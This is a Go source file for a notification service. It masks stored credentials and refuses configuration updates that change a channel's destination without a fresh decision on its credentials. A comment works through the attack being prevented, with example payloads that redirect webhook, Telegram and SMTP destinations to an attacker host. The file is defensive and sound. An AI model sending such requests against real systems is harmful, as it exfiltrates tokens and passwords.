package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks a masked value. When the API returns credentials, it replaces the real
// value with a string using this prefix; when an update receives that prefix, it means
// "keep the existing database value."
//
// Use a prefix instead of an empty string or fixed constant so MaskedValue can include a small
// identifying hint (see MaskedValue), letting users tell which bot it is without pasting the
// secret again.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original value is too short to show a hint
//	"__masked__:…ab12cd"      includes the last six characters as an identifying hint
//
// Showing only the last six characters is deliberate: identifying information in webhook
// addresses is at the end (such as a WeCom key or Feishu bot ID), while prefixes are shared
// by bots and provide no identifying value. Six characters are not enough to recover a
// credential, but are enough for an administrator to recognize the group.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (that is, it was not changed after being returned by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with its credential fields replaced by masked values.
//
// Unknown channel types return an empty map instead of the original configuration: it is safer
// to show "configuration unavailable" than to expose potentially secret content when the
// channel type cannot be identified. Non-credential fields are preserved for the UI.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as one credential. Checking each child key would
		// require a separate "which child keys are credentials" rule for every channel, adding far
		// more complexity than value.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did
// not specify what to do with credential fields." Return it instead of silently allowing the
// update or discarding credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination keys that changed
	Missing []string // Credential keys without an explicit decision
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination changed (" + strings.Join(e.Changed, ", ") + "). Please also update credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values or leave them empty to indicate credentials are no longer needed. " +
		"The old credentials were valid only for the previous destination; reusing them would send them to the new one."
}

// PrepareConfigUpdate merges channel configuration and handles the security-sensitive case of a changed destination.
//
// It replaces bare MergeConfig on the channel-update path to prevent a demonstrated attack:
// the destination (where a message is sent) and credentials (which identity sends it) are
// separate fields, and MergeConfig preserves stored values for keys not mentioned. Anyone
// able to PATCH a channel could change only the destination and send stored credentials to
// an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → send the stored Authorization header
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real-token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → send the username and password after STARTTLS
//
// This path is silent and does not depend on redirects (so rejecting cross-host redirects does
// not stop it). It also defeats this package's goal of never echoing credentials to the browser.
//
// Rule: whenever a destination key changes, the caller must explicitly decide what to do with
// every credential key:
//   - provide a new value → use it
//   - provide an empty string → credentials are no longer needed for this field
//   - return the masked value unchanged or omit the key → reject
//
// The third case is rejected because a masked value means "reuse the old credential," which is
// valid only for the old destination. Do not discard credentials automatically: for optional
// credentials (webhook headers, email password), that could silently remove authentication while
// returning HTTP 200, which is harder to diagnose than an error. Require the operator to decide.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook headers) contains a masked literal, the
	// caller put the "keep existing value" sentinel inside a structure. MergeConfig recognizes
	// masked values only when they are strings with the prefix; otherwise this would be stored as
	// an ordinary object, silently breaking authentication. Reject it.
	//
	// Check this first: when the destination is unchanged, the function returns early, so a later
	// check would cover only destination changes (the first implementation made this mistake and a test caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. A masked value counts as unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: use a normal merge (masked values preserve the old value, empty strings clear, and other values overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require an explicit decision for each credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects masked sentinels nested inside non-string structures.
//
// The masking mechanism assumes the whole value is a string. Object fields such as webhook
// headers must be masked as a whole (the string "__masked__") or submitted as a whole; a
// sentinel inside the object cannot express "keep unchanged" and would be stored as real data.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains masked marker %q: submit the whole field as empty to keep it or provide a new value; masked placeholders cannot be nested inside an object",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue checks whether two configuration values are equivalent. JSON serialization
// also handles type differences: the UI submits a port as a number, while the database returns
// it as float64, so direct equality would give a false mismatch.
//
// Normalize empty values before comparing: in this configuration model, an empty string and a
// missing key are equivalent because MergeConfig treats an empty string as an explicit clear
// and deletes the key. Without normalization, an optional destination field that stays empty
// (Telegram base_url is the only such field; empty means use the official URL) would follow this path:
//
//	base_url:"" saved on create → first update deletes the key in MergeConfig
//	→ second update has incoming "" and no stored key, judged as a destination change
//	→ credential is masked → 400 "Destination changed; please update the credential fields"
//
// Every later save would fail until the user pasted the Bot Token again, even though nothing changed.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a configuration value is empty.
// Its definition must match MergeConfig (strings.TrimSpace(s) == ""), or MergeConfig may delete
// a value that sameConfigValue considers non-empty.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig overlays incoming values on stored values when updating channel configuration.
//
// Rules:
//   - a masked value in incoming → preserve the stored value (the user did not change this field)
//   - an empty string in incoming → explicitly clear the field and delete the key
//   - any other incoming value → overwrite the stored value
//   - a key in stored but absent from incoming → preserve it (partial-update semantics)
//
// Empty strings explicitly mean "clear": the UI submits unfilled fields as empty strings, and
// treating them as ordinary values would clear fields that were left blank to preserve their
// old values. This gives users a way to remove an incorrect field (omitting a field could express
// "not provided" vs "empty," but the UI does not need that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value = unchanged; preserve stored value.
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
